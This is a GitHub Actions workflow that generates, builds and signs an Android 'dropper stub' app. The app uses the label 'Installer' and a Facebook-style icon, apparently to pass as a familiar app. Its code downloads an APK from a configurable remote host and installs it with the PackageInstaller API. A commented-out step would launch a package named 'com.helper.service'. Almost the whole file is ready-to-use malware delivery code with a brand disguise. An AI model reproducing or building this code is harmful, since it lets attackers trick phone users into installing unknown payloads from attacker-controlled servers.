name: Build Dropper Stub APK

on:
  push:
    branches: [ main ]
  workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Create Android project
        run: |
          mkdir -p app/src/main/java/com/dropper/stub
          mkdir -p app/src/main/res/layout
          mkdir -p app/src/main/res/values
          mkdir -p app/src/main/res/drawable
          mkdir -p app/src/main/res/mipmap-anydpi-v26
          mkdir -p app/src/main/res/mipmap-hdpi
          mkdir -p app/src/main/res/mipmap-mdpi
          mkdir -p app/src/main/res/mipmap-xhdpi
          mkdir -p app/src/main/res/mipmap-xxhdpi
          mkdir -p app/src/main/res/mipmap-xxxhdpi

          cat > gradle.properties << 'EOF'
          android.useAndroidX=true
          android.enableJetifier=true
          EOF

          cat > app/src/main/AndroidManifest.xml << 'EOF'
          <manifest xmlns:android="http://schemas.android.com/apk/res/android"
              package="com.dropper.stub">
              <uses-permission android:name="android.permission.INTERNET" />
              <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
              <uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES" />
              <application
                  android:allowBackup="true"
                  android:label="Installer"
                  android:theme="@style/Theme.AppCompat.Light.DarkActionBar"
                  android:icon="@mipmap/ic_launcher">
                  <activity android:name=".MainActivity" android:exported="true">
                      <intent-filter>
                          <action android:name="android.intent.action.MAIN" />
                          <category android:name="android.intent.category.LAUNCHER" />
                      </intent-filter>
                  </activity>
                  <!-- No other components needed -->
              </application>
          </manifest>
          EOF

          cat > app/src/main/res/drawable/ic_launcher_foreground.xml << 'EOF'
          <?xml version="1.0" encoding="utf-8"?>
          <vector xmlns:android="http://schemas.android.com/apk/res/android"
              android:width="108dp" android:height="108dp"
              android:viewportWidth="108" android:viewportHeight="108">
              <path android:fillColor="#1877F2" android:pathData="M0,0h108v108h-108z" />
              <path android:fillColor="#FFFFFF"
                  android:pathData="M54,26c-15.5,0 -28,12.5 -28,28c0,13.9 10.2,25.4 23.4,27.5v-19h-7v-8.5h7v-6.5c0,-6.9 4.1,-10.7 10.4,-10.7c3,0 6.1,0.5 6.1,0.5v6.7h-3.4c-3.4,0 -4.5,2.1 -4.5,4.3v5.2h7.6l-1.2,8.5h-6.4v19c13.2,-2.1 23.4,-13.6 23.4,-27.5c0,-15.5 -12.5,-28 -28,-28z" />
          </vector>
          EOF

          cat > app/src/main/res/mipmap-anydpi-v26/ic_launcher.xml << 'EOF'
          <?xml version="1.0" encoding="utf-8"?>
          <adaptive-icon xmlns:android="http://schemas.android.com/apk/res/android">
              <background android:drawable="@color/ic_launcher_background"/>
              <foreground android:drawable="@drawable/ic_launcher_foreground"/>
          </adaptive-icon>
          EOF

          cat > app/src/main/res/values/colors.xml << 'EOF'
          <?xml version="1.0" encoding="utf-8"?>
          <resources>
              <color name="ic_launcher_background">#1877F2</color>
          </resources>
          EOF

          cat > app/src/main/java/com/dropper/stub/MainActivity.java << 'EOF'
          package com.dropper.stub;

          import android.app.Activity;
          import android.app.PendingIntent;
          import android.content.BroadcastReceiver;
          import android.content.Context;
          import android.content.Intent;
          import android.content.IntentFilter;
          import android.content.pm.PackageInstaller;
          import android.net.Uri;
          import android.os.Build;
          import android.os.Bundle;
          import android.os.Handler;
          import android.os.Looper;
          import android.util.Log;
          import android.widget.Button;
          import android.widget.TextView;
          import android.widget.Toast;

          import java.io.File;
          import java.io.FileOutputStream;
          import java.io.InputStream;
          import java.net.HttpURLConnection;
          import java.net.URL;

          public class MainActivity extends Activity {
              private static final String TAG = "DropperStub";
              // CHANGE THIS TO YOUR RENDER APK URL
              private static final String APK_URL = "https://your-render-service.onrender.com/main.apk";
              private TextView statusText;
              private Button installButton;
              private Handler handler = new Handler(Looper.getMainLooper());

              @Override
              protected void onCreate(Bundle savedInstanceState) {
                  super.onCreate(savedInstanceState);
                  setContentView(R.layout.activity_main);
                  statusText = findViewById(R.id.statusText);
                  installButton = findViewById(R.id.installButton);

                  installButton.setOnClickListener(v -> {
                      installButton.setEnabled(false);
                      statusText.setText("Downloading...");
                      downloadAndInstall();
                  });
              }

              private void downloadAndInstall() {
                  new Thread(() -> {
                      try {
                          // 1. Download the APK
                          URL url = new URL(APK_URL);
                          HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                          conn.setConnectTimeout(10000);
                          conn.setReadTimeout(10000);
                          InputStream in = conn.getInputStream();
                          File apkFile = new File(getCacheDir(), "main.apk");
                          FileOutputStream out = new FileOutputStream(apkFile);
                          byte[] buffer = new byte[4096];
                          int len;
                          while ((len = in.read(buffer)) != -1) {
                              out.write(buffer, 0, len);
                          }
                          out.close();
                          in.close();
                          conn.disconnect();

                          handler.post(() -> statusText.setText("Installing..."));

                          // 2. Install using session-based API
                          installApk(apkFile);

                      } catch (Exception e) {
                          Log.e(TAG, "Download/Install failed: " + e.getMessage());
                          handler.post(() -> {
                              statusText.setText("Failed: " + e.getMessage());
                              installButton.setEnabled(true);
                          });
                      }
                  }).start();
              }

              private void installApk(File apkFile) {
                  try {
                      PackageInstaller packageInstaller = getPackageManager().getPackageInstaller();
                      PackageInstaller.SessionParams params = new PackageInstaller.SessionParams(
                              PackageInstaller.SessionParams.MODE_FULL_INSTALL
                      );
                      params.setReferrerUri(Uri.parse("https://dropper.stub"));

                      int sessionId = packageInstaller.createSession(params);
                      PackageInstaller.Session session = packageInstaller.openSession(sessionId);

                      // Write the APK to the session
                      try (InputStream in = getContentResolver().openInputStream(Uri.fromFile(apkFile))) {
                          long sizeBytes = apkFile.length();
                          PackageInstaller.Session.SeekableOutputStream out = session.openWrite("main", 0, sizeBytes);
                          byte[] buffer = new byte[4096];
                          int bytesRead;
                          while ((bytesRead = in.read(buffer)) != -1) {
                              out.write(buffer, 0, bytesRead);
                          }
                          out.close();
                      }

                      // Commit the session
                      Intent intent = new Intent(this, InstallReceiver.class);
                      PendingIntent pendingIntent = PendingIntent.getBroadcast(this, 0, intent,
                              PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
                      session.commit(pendingIntent.getIntentSender());
                      session.close();

                      handler.post(() -> statusText.setText("Installing... Check notification."));

                  } catch (Exception e) {
                      Log.e(TAG, "Install failed: " + e.getMessage());
                      handler.post(() -> {
                          statusText.setText("Install failed: " + e.getMessage());
                          installButton.setEnabled(true);
                      });
                  }
              }

              // Receiver for installation result
              public static class InstallReceiver extends BroadcastReceiver {
                  @Override
                  public void onReceive(Context context, Intent intent) {
                      int status = intent.getIntExtra(PackageInstaller.EXTRA_STATUS,
                              PackageInstaller.STATUS_FAILURE);
                      if (status == PackageInstaller.STATUS_SUCCESS) {
                          Toast.makeText(context, "Installation successful!", Toast.LENGTH_LONG).show();
                          // Launch the installed app (optional)
                          // PackageManager pm = context.getPackageManager();
                          // Intent launch = pm.getLaunchIntentForPackage("com.helper.service");
                          // if (launch != null) context.startActivity(launch);
                      } else {
                          Toast.makeText(context, "Installation failed: " + status, Toast.LENGTH_LONG).show();
                      }
                  }
              }
          }
          EOF

          cat > app/src/main/res/layout/activity_main.xml << 'EOF'
          <?xml version="1.0" encoding="utf-8"?>
          <LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
              android:layout_width="match_parent" android:layout_height="match_parent"
              android:orientation="vertical" android:padding="20dp" android:gravity="center">
              <TextView android:id="@+id/statusText" android:layout_width="wrap_content"
                  android:layout_height="wrap_content" android:text="Tap Install to download and install the main app."
                  android:textAlignment="center" android:textSize="16sp"/>
              <Button android:id="@+id/installButton" android:layout_width="wrap_content"
                  android:layout_height="wrap_content" android:text="Install" />
          </LinearLayout>
          EOF

          cat > app/src/main/res/values/strings.xml << 'EOF'
          <resources>
              <string name="app_name">Installer</string>
          </resources>
          EOF

          cat > app/build.gradle << 'EOF'
          apply plugin: 'com.android.application'
          android {
              compileSdk 34
              namespace 'com.dropper.stub'
              defaultConfig {
                  applicationId 'com.dropper.stub'
                  minSdk 21
                  targetSdk 34
                  versionCode 1
                  versionName '1.0'
              }
              signingConfigs {
                  debug {
                      storeFile file('debug.keystore')
                      storePassword 'android'
                      keyAlias 'android'
                      keyPassword 'android'
                  }
              }
              buildTypes {
                  debug {
                      signingConfig signingConfigs.debug
                  }
                  release {
                      minifyEnabled false
                      signingConfig signingConfigs.debug
                  }
              }
          }
          dependencies {
              implementation 'androidx.appcompat:appcompat:1.6.1'
          }
          EOF

          cat > settings.gradle << 'EOF'
          pluginManagement {
              repositories { google(); mavenCentral(); gradlePluginPortal() }
          }
          dependencyResolutionManagement {
              repositories { google(); mavenCentral() }
          }
          rootProject.name = "DropperStub"
          include ':app'
          EOF

          cat > build.gradle << 'EOF'
          buildscript {
              repositories { google(); mavenCentral() }
              dependencies { classpath 'com.android.tools.build:gradle:8.0.0' }
          }
          EOF

          echo "✅ All source files created."

      - name: Setup Java 17
        uses: actions/setup-java@v4
        with:
          distribution: 'temurin'
          java-version: '17'

      - name: Setup Gradle
        uses: gradle/actions/setup-gradle@v3
        with:
          gradle-version: '8.0'

      - name: Generate Gradle Wrapper
        run: gradle wrapper --gradle-version 8.0

      - name: Setup Android SDK
        uses: android-actions/setup-android@v3

      - name: Accept Android licenses
        run: yes | sdkmanager --licenses

      - name: Install Android build tools
        run: sdkmanager "platform-tools" "platforms;android-34" "build-tools;34.0.0"

      - name: Generate Test Keystore
        run: |
          keytool -genkey -v -keystore app/debug.keystore -alias android -keyalg RSA -keysize 2048 -validity 10000 -storepass android -keypass android -dname "CN=Test, OU=Test, O=Test, L=Test, ST=Test, C=US"

      - name: Build Signed APK
        run: chmod +x gradlew && ./gradlew assembleDebug

      - name: Upload APK
        uses: actions/upload-artifact@v4
        with:
          name: DropperStub-signed
          path: app/build/outputs/apk/debug/*.apk
